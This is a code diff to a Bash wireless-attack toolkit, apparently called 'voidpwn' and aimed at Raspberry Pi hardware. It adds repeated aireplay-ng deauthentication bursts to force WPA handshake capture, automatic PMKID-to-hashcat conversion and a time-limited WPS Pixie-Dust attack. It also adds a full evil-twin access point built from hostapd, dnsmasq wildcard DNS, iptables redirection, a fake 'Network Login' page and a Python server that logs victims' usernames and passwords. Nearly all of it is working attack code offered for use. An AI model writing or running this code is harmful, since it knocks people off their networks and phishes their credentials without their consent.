@@ -162,7 +162,7 @@ enable_monitor_mode() {
         # Brute-force fallback
         log_info "Attempting fallback method..."
         ip link set "$INTERFACE" down
-        iw "$INTERFACE" set monitor none
+        iw "$INTERFACE" set type monitor
         ip link set "$INTERFACE" up
         MONITOR_INTERFACE="$INTERFACE"
         if iw dev 2>/dev/null | awk "/Interface $INTERFACE/{f=1} f && /type/{print; f=0}" | grep -q monitor; then
@@ -177,8 +177,17 @@ enable_monitor_mode() {
 # Disable monitor mode
 disable_monitor_mode() {
     log_info "Disabling monitor mode..."
-    airmon-ng stop "$MONITOR_INTERFACE" > /dev/null 2>&1
-    systemctl restart NetworkManager
+    airmon-ng stop "$MONITOR_INTERFACE" > /dev/null 2>&1 || true
+    # Restore managed mode manually (RPi uses dhcpcd + wpa_supplicant, not NetworkManager)
+    ip link set "$MONITOR_INTERFACE" down 2>/dev/null || true
+    iw "$MONITOR_INTERFACE" set type managed 2>/dev/null || true
+    ip link set "$INTERFACE" up 2>/dev/null || true
+    # Restart dhcpcd if available (Raspberry Pi default), otherwise try NetworkManager
+    if systemctl is-active --quiet dhcpcd 2>/dev/null || systemctl list-units --all | grep -q dhcpcd; then
+        systemctl restart dhcpcd 2>/dev/null || true
+    elif systemctl is-active --quiet NetworkManager 2>/dev/null; then
+        systemctl restart NetworkManager 2>/dev/null || true
+    fi
     log_success "Monitor mode disabled"
 }
 
@@ -237,17 +246,34 @@ capture_handshake() {
     airodump-ng -c "$channel" --bssid "$bssid" -w "$output_file" "$MONITOR_INTERFACE" &
     local airodump_pid=$!
     
+    # Wait for airodump to stabilise before sending deauths
+    sleep 5
+    
+    # Send deauth bursts to force clients to re-authenticate
+    log_info "Sending deauth burst 1..."
+    aireplay-ng --deauth 20 -a "$bssid" --ignore-negative-one "$MONITOR_INTERFACE"
     sleep 3
-    
-    # Send deauth packets (Aggressive Mode)
-    log_info "Sending deauth packets..."
-    aireplay-ng --deauth 10 -a "$bssid" --ignore-negative-one "$MONITOR_INTERFACE"
-    
-    sleep 2
+    log_info "Sending deauth burst 2..."
+    aireplay-ng --deauth 20 -a "$bssid" --ignore-negative-one "$MONITOR_INTERFACE"
+    sleep 3
+    log_info "Sending deauth burst 3..."
+    aireplay-ng --deauth 20 -a "$bssid" --ignore-negative-one "$MONITOR_INTERFACE"
+
+    # Keep capturing for remaining window to catch the re-association handshake
+    log_info "Waiting for handshake..."
+    sleep 15
     kill $airodump_pid 2>/dev/null
-    
-    log_success "Capture complete: $output_file"
-    log_info "Crack with: aircrack-ng -w <wordlist> ${output_file}-01.cap"
+    wait $airodump_pid 2>/dev/null
+
+    # Verify a handshake was actually captured
+    local cap_file="${output_file}-01.cap"
+    if [[ -f "$cap_file" ]] && aircrack-ng "$cap_file" 2>/dev/null | grep -q "1 handshake"; then
+        log_success "Handshake captured: $cap_file"
+    else
+        log_warning "Handshake may not have been captured — check: $cap_file"
+        log_info "Try moving closer to the AP or ensuring a client is associated."
+    fi
+    log_info "Crack with: aircrack-ng -w <wordlist> $cap_file"
 }
 
 # Automated attack with Wifite
@@ -318,46 +344,191 @@ deauth_attack() {
 evil_twin() {
     local ssid="$1"
     local channel="${2:-6}"
-    
+
     if [[ -z "$ssid" ]]; then
         log_error "Usage: $0 --evil-twin <SSID> [CHANNEL]"
         exit 1
     fi
-    
-    log_info "Setting up Evil Twin attack for: $ssid"
 
-    # Check for advanced tools first
-    if command -v wifiphisher &> /dev/null; then
-        log_info "Launching Wifiphisher for advanced Evil Twin attack..."
-        # wifiphisher requires interactive mode usually, but we try to pass ESSID
-        wifiphisher --essid "$ssid"
-        return
+    # Verify required tools are installed
+    for tool in hostapd dnsmasq iptables python3; do
+        if ! command -v "$tool" &>/dev/null; then
+            log_error "$tool is not installed. Run: sudo apt install $tool"
+            exit 1
+        fi
+    done
+
+    log_info "Setting up Evil Twin AP: '$ssid' on channel $channel"
+
+    # Determine AP interface (use managed-mode interface, not monitor)
+    local ap_iface="${INTERFACE:-wlan0}"
+    [[ -z "$ap_iface" ]] && ap_iface=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -n 1)
+    if [[ -z "$ap_iface" ]]; then
+        log_error "No wireless interface found. Specify one with --interface."
+        exit 1
     fi
-    
-    if [ -d "/opt/fluxion" ]; then
-        log_info "Found Fluxion. Launching..."
-        log_warning "Fluxion is interactive. Follow the on-screen prompts."
-        cd /opt/fluxion && ./fluxion.sh
-        return
+
+    # Ensure interface is in managed mode (not monitor)
+    ip link set "$ap_iface" down 2>/dev/null
+    iw "$ap_iface" set type managed 2>/dev/null || true
+    ip link set "$ap_iface" up 2>/dev/null
+
+    local AP_IP="10.0.0.1"
+    local AP_SUBNET="10.0.0.0/24"
+    local DHCP_START="10.0.0.10"
+    local DHCP_END="10.0.0.100"
+    local PORTAL_PORT="8080"
+    local TIMESTAMP
+    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+    local LOG_FILE="$OUTPUT_DIR/eviltwin_${TIMESTAMP}.txt"
+
+    # Assign static IP to AP interface
+    ip addr flush dev "$ap_iface" 2>/dev/null
+    ip addr add "${AP_IP}/24" dev "$ap_iface"
+
+    # Write hostapd config
+    local HOSTAPD_CONF="/tmp/hostapd_voidpwn_${TIMESTAMP}.conf"
+    cat > "$HOSTAPD_CONF" << HAPDEOF
+interface=$ap_iface
+driver=nl80211
+ssid=$ssid
+hw_mode=g
+channel=$channel
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+HAPDEOF
+
+    # Write dnsmasq config — DHCP + wildcard DNS redirect to portal
+    local DNSMASQ_CONF="/tmp/dnsmasq_voidpwn_${TIMESTAMP}.conf"
+    cat > "$DNSMASQ_CONF" << DMEOF
+interface=$ap_iface
+dhcp-range=$DHCP_START,$DHCP_END,255.255.255.0,12h
+dhcp-option=3,$AP_IP
+dhcp-option=6,$AP_IP
+address=/#/$AP_IP
+no-resolv
+log-queries
+DMEOF
+
+    # Redirect all HTTP traffic to captive portal
+    iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 80 \
+        -j DNAT --to-destination "${AP_IP}:${PORTAL_PORT}" 2>/dev/null
+    iptables -t nat -A POSTROUTING -o "$ap_iface" -j MASQUERADE 2>/dev/null
+
+    # Write minimal captive portal page
+    local PORTAL_DIR="/tmp/voidpwn_portal_${TIMESTAMP}"
+    mkdir -p "$PORTAL_DIR"
+    cat > "$PORTAL_DIR/index.html" << HTMLEOF
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<title>WiFi Login</title>
+<style>body{font-family:sans-serif;background:#1a1a2e;color:#eee;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+.box{background:#16213e;padding:40px;border-radius:8px;max-width:350px;width:100%;text-align:center}
+h2{color:#0f3460;margin-bottom:20px}input{width:100%;padding:10px;margin:8px 0;border:1px solid #333;background:#0f3460;color:#eee;border-radius:4px;box-sizing:border-box}
+button{width:100%;padding:12px;background:#e94560;border:none;color:#fff;border-radius:4px;cursor:pointer;font-size:16px}</style>
+</head><body><div class="box">
+<h2>&#x1F4F6; Network Login</h2>
+<p>Enter your credentials to connect.</p>
+<form method="POST" action="/login">
+<input type="text" name="username" placeholder="Username" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Connect</button>
+</form></div></body></html>
+HTMLEOF
+
+    # Minimal Python HTTP server to capture credentials
+    local PORTAL_PY="/tmp/voidpwn_portal_${TIMESTAMP}.py"
+    cat > "$PORTAL_PY" << PYEOF
+import http.server, urllib.parse, os, datetime
+
+LOG = "${LOG_FILE}"
+PORT = ${PORTAL_PORT}
+DIR  = "${PORTAL_DIR}"
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def log_message(self, fmt, *args): pass
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type","text/html")
+        self.end_headers()
+        with open(os.path.join(DIR,"index.html"),"rb") as f:
+            self.wfile.write(f.read())
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length",0))
+        body   = self.rfile.read(length).decode("utf-8","ignore")
+        params = urllib.parse.parse_qs(body)
+        ts     = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        user   = params.get("username",[""])[0]
+        pwd    = params.get("password",[""])[0]
+        entry  = f"[{ts}] CAPTURED — user='{user}' pass='{pwd}' src={self.client_address[0]}\n"
+        with open(LOG,"a") as lf:
+            lf.write(entry)
+        print(entry, end="", flush=True)
+        # Redirect back to portal
+        self.send_response(302)
+        self.send_header("Location","/")
+        self.end_headers()
+
+http.server.HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
+PYEOF
+
+    # Cleanup function
+    cleanup_evil_twin() {
+        log_warning "Stopping Evil Twin AP and cleaning up..."
+        kill "$HOSTAPD_PID" 2>/dev/null
+        kill "$DNSMASQ_PID" 2>/dev/null
+        kill "$PORTAL_PID"  2>/dev/null
+        iptables -t nat -D PREROUTING -i "$ap_iface" -p tcp --dport 80 \
+            -j DNAT --to-destination "${AP_IP}:${PORTAL_PORT}" 2>/dev/null
+        iptables -t nat -D POSTROUTING -o "$ap_iface" -j MASQUERADE 2>/dev/null
+        ip addr flush dev "$ap_iface" 2>/dev/null
+        rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF" "$PORTAL_PY"
+        rm -rf "$PORTAL_DIR"
+        log_success "Evil Twin AP stopped. Credentials log: $LOG_FILE"
+    }
+    trap cleanup_evil_twin INT TERM
+
+    # Start services
+    log_info "Starting hostapd (AP broadcast)..."
+    hostapd "$HOSTAPD_CONF" >> "$LOG_FILE" 2>&1 &
+    HOSTAPD_PID=$!
+    sleep 2
+
+    if ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
+        log_error "hostapd failed to start. Check that $ap_iface supports AP mode."
+        log_error "Details: $LOG_FILE"
+        # Clean up iptables rules that were set before hostapd was launched
+        iptables -t nat -D PREROUTING -i "$ap_iface" -p tcp --dport 80 \
+            -j DNAT --to-destination "${AP_IP}:${PORTAL_PORT}" 2>/dev/null
+        iptables -t nat -D POSTROUTING -o "$ap_iface" -j MASQUERADE 2>/dev/null
+        ip addr flush dev "$ap_iface" 2>/dev/null
+        rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF"
+        exit 1
     fi
 
-    # Fallback to airbase-ng (Basic Soft AP)
-    log_info "Advanced tools (wifiphisher/fluxion) not found."
-    log_info "Starting Basic Evil Twin AP using airbase-ng..."
-    
-    enable_monitor_mode
+    log_info "Starting dnsmasq (DHCP + DNS)..."
+    dnsmasq -C "$DNSMASQ_CONF" --pid-file=/tmp/dnsmasq_voidpwn.pid >> "$LOG_FILE" 2>&1 &
+    DNSMASQ_PID=$!
+    sleep 2
 
-    log_info "Switching $MONITOR_INTERFACE to channel $channel..."
-    iw dev "$MONITOR_INTERFACE" set channel "$channel" 2>/dev/null || iwconfig "$MONITOR_INTERFACE" channel "$channel" 2>/dev/null || true
+    if ! kill -0 "$DNSMASQ_PID" 2>/dev/null; then
+        log_error "dnsmasq failed to start. Check config: $DNSMASQ_CONF"
+        cleanup_evil_twin
+        exit 1
+    fi
+
+    log_info "Starting captive portal on port $PORTAL_PORT..."
+    python3 "$PORTAL_PY" >> "$LOG_FILE" 2>&1 &
+    PORTAL_PID=$!
     sleep 1
-    
-    log_info "Broadcasting SSID: $ssid on channel $channel"
-    log_warning "This creates a fake AP. Clients may connect, but won't have internet access"
-    log_warning "without further IP checking/routing configuration."
+
+    log_success "Evil Twin AP running: SSID='$ssid' on channel $channel (iface: $ap_iface)"
+    log_info   "Captive portal active at http://$AP_IP:$PORTAL_PORT"
+    log_info   "Credentials will be logged to: $LOG_FILE"
     log_warning "Press Ctrl+C to stop"
-    echo ""
-    
-    airbase-ng -e "$ssid" -c "$channel" "$MONITOR_INTERFACE"
+
+    # Wait for hostapd to exit or Ctrl+C
+    wait "$HOSTAPD_PID"
 }
 
 # Crack captured handshake
@@ -424,7 +595,19 @@ pmkid_capture() {
     
     if [[ -f "$output_pcapng" ]]; then
         log_success "Capture complete: $output_pcapng"
-        log_info "Convert to hashcat format using: hcxpcapngtool -o hash.hc22000 $output_pcapng"
+        if command -v hcxpcapngtool &>/dev/null; then
+            local hash_file="${output_pcapng%.pcapng}.hc22000"
+            hcxpcapngtool -o "$hash_file" "$output_pcapng" 2>/dev/null
+            if [[ -s "$hash_file" ]]; then
+                log_success "Hash file ready: $hash_file"
+                log_info "Crack with: hashcat -m 22000 \"$hash_file\" <wordlist>"
+            else
+                log_warning "Conversion produced empty hash — no PMKID/EAPOL captured. Try again near an active AP."
+                rm -f "$hash_file"
+            fi
+        else
+            log_info "Convert manually: hcxpcapngtool -o hash.hc22000 \"$output_pcapng\""
+        fi
     else
         log_error "Capture failed or no data collected"
     fi
@@ -493,8 +676,13 @@ wps_pixie_dust() {
     [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
     
     log_info "Starting WPS Pixie-Dust attack against $bssid..."
+    log_warning "Timeout: 5 minutes. Press Ctrl+C to abort early."
     # -i: interface, -b: bssid, -K: pixie-dust, -vv: verbose
-    reaver -i "$interface" -b "$bssid" -K 1 -vv
+    timeout 300 reaver -i "$interface" -b "$bssid" -K 1 -vv
+    local exit_code=$?
+    if [[ $exit_code -eq 124 ]]; then
+        log_warning "Pixie-Dust attack timed out after 5 minutes (WPS may not be vulnerable)"
+    fi
 }
 
 # Show help
